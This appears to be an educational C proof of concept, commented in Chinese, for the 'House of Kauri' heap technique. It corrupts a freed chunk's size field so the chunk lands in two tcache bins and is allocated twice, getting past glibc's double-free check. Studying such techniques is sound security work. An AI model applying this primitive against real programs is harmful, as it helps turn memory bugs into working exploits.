/*
 * 中文导读：House of Kauri，适用于 glibc 2.26～2.41，x86-64。
 *
 * 漏洞模型：victim 第一次 free 之后，我们仍然能改写它的 chunk size 字段。
 * 先让它进入 0x20 那条 tcache，再把 size 从 0x21 改成 0x31，这样第二次
 * free 时它就会被送进 0x30 那条 tcache。2.29～2.41 的 key 校验只会扫描
 * “新 size 对应的那条 bin”，所以看不到 victim 其实还留在旧 bin 里；
 * 2.42 起改为扫描所有 bin，这条绕过路径就走不通了，本程序在那之后的
 * 版本上会正确触发 abort。
 */
#include <assert.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>

int main(void) {
    setbuf(stdout, NULL);

    uint64_t *victim = malloc(0x18);        /* 实际分配到的 chunk size 是 0x20 */
    void *guard = malloc(0x38);             /* 仅用来固定物理布局，防止后续 chunk 相邻合并 */
    (void)guard;

    free(victim);                           /* victim 此时进入 tc_idx=0 这条 tcache */

    /*
     * 漏洞触发点：用户指针往前 8 字节就是 mchunk_size 字段。
     * 提醒一下：真实题目里这一步需要靠溢出或 UAF 才能完成写入，这里是直接模拟。
     */
    victim[-1] = 0x31;
    free(victim);                           /* 同一个地址又被送进 tc_idx=1 这条 tcache */

    void *from_30 = malloc(0x28);           /* 从 0x30 这条 tcache 取出 victim */
    void *from_20 = malloc(0x18);           /* 再从 0x20 这条 tcache 取出同一个 victim */

    assert(from_30 == victim);
    assert(from_20 == victim);
    assert(from_30 == from_20);
    puts("[+] Kauri：跨 bin 重复分配成功");
    return 0;
}
